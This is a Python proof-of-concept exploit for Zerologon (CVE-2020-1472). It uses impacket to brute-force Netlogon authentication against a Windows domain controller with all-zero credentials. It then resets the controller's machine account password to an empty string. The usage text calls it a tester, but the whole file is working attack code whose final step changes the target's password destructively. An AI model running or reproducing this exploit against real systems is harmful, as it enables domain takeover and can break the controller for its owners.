#!/usr/bin/env python3
'''ZEROLOGON POC FOR CVE-2020-1472'''

import sys

from impacket.dcerpc.v5 import nrpc, epm
# from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5 import transport
# from impacket import crypto
# import hmac, hashlib, struct, sys, socket, time
# from binascii import hexlify, unhexlify
# from subprocess import check_call


# Give up brute-forcing after this many attempts. If vulnerable, 256 attempts are expected to be neccessary on average.
MAX_ATTEMPTS = 2000 # False negative chance: 0.04%

def fail(msg):
    print(msg, file=sys.stderr)
    print('This might have been caused by invalid arguments or network issues.', file=sys.stderr)
    return
    # sys.exit(2)

def try_zero_authenticate(rpc_con, dc_handle, dc_ip, target_computer):
    # Connect to the DC's Netlogon service.


    # Use an all-zero challenge and credential.
    plaintext = b'\x00' * 8
    ciphertext = b'\x00' * 8

    # Standard flags observed from a Windows 10 client (including AES), with only the sign/seal flag disabled.
    flags = 0x212fffff

    # Send challenge and authentication request.
    nrpc.hNetrServerReqChallenge(rpc_con, dc_handle + '\x00', target_computer + '\x00', plaintext)
    try:
        server_auth = nrpc.hNetrServerAuthenticate3(
            rpc_con, dc_handle + '\x00', target_computer + '$\x00', nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
            target_computer + '\x00', ciphertext, flags
        )


        # It worked!
        assert server_auth['ErrorCode'] == 0
        return True

    except nrpc.DCERPCSessionError as ex:
        # Failure should be due to a STATUS_ACCESS_DENIED error. Otherwise, the attack is probably not working.
        if ex.get_error_code() == 0xc0000022:
            return None
        else:
            fail(f'Unexpected error code from DC: {ex.get_error_code()}.')
    except BaseException as ex:
        fail(f'Unexpected error: {ex}.')

def exploit(dc_handle, rpc_con, target_computer):
    request = nrpc.NetrServerPasswordSet2()
    request['PrimaryName'] = dc_handle + '\x00'
    request['AccountName'] = target_computer + '$\x00'
    request['SecureChannelType'] = nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel
    authenticator = nrpc.NETLOGON_AUTHENTICATOR()
    authenticator['Credential'] = b'\x00' * 8
    authenticator['Timestamp'] = 0
    request['Authenticator'] = authenticator
    request['ComputerName'] = target_computer + '\x00'
    request['ClearNewPassword'] = b'\x00' * 516
    return rpc_con.request(request)

def perform_attack(dc_handle, dc_ip, target_computer):
    # Keep authenticating until succesfull. Expected average number of attempts needed: 256.
    print('Performing authentication attempts...')
    rpc_con = None
    binding = epm.hept_map(dc_ip, nrpc.MSRPC_UUID_NRPC, protocol='ncacn_ip_tcp')
    rpc_con = transport.DCERPCTransportFactory(binding).get_dce_rpc()
    rpc_con.connect()
    rpc_con.bind(nrpc.MSRPC_UUID_NRPC)
    for attempt in range(0, MAX_ATTEMPTS):
        result = try_zero_authenticate(rpc_con, dc_handle, dc_ip, target_computer)

        if result is None:
            print('=', end='', flush=True)
        else:
            break


    if result:
        print('\nTarget vulnerable, changing account password to empty string')
        result = None
        for attempt in range(0, MAX_ATTEMPTS):
            try:
                result = exploit(dc_handle, rpc_con, target_computer)
            except nrpc.DCERPCSessionError as ex:
                # Failure should be due to a STATUS_ACCESS_DENIED error. Otherwise, the attack is probably not working.
                if ex.get_error_code() == 0xc0000022:
                    pass
                else:
                    fail(f'Unexpected error code from DC: {ex.get_error_code()}.')
            except BaseException as ex:
                fail(f'Unexpected error: {ex}.')
            if result is None:
                print('=', end='', flush=True)
            else:
                break

        print('\nResult: ', end='')
        print(result['ErrorCode'])
        if result['ErrorCode'] == 0:
            print('\nExploit complete!')
        else:
            print('Non-zero return code, something went wrong?')
    else:
        print('\nAttack failed. Target is probably patched.')
        # sys.exit(1)

def main():
    if not (3 <= len(sys.argv) <= 4):
        print('Usage: zerologon_tester.py <dc-name> <dc-ip>\n')
        print('Tests whether a domain controller is vulnerable to the Zerologon attack. Resets the DC account password to an empty string when vulnerable.')
        print('Note: dc-name should be the (NetBIOS) computer name of the domain controller.')
        # sys.exit(1)
    else:
        [_, dc_name, dc_ip] = sys.argv

        dc_name = dc_name.rstrip('$')
        victim = dc_name
        perform_attack('\\\\' + dc_name, dc_ip, victim)

if __name__ == '__main__':
    main()
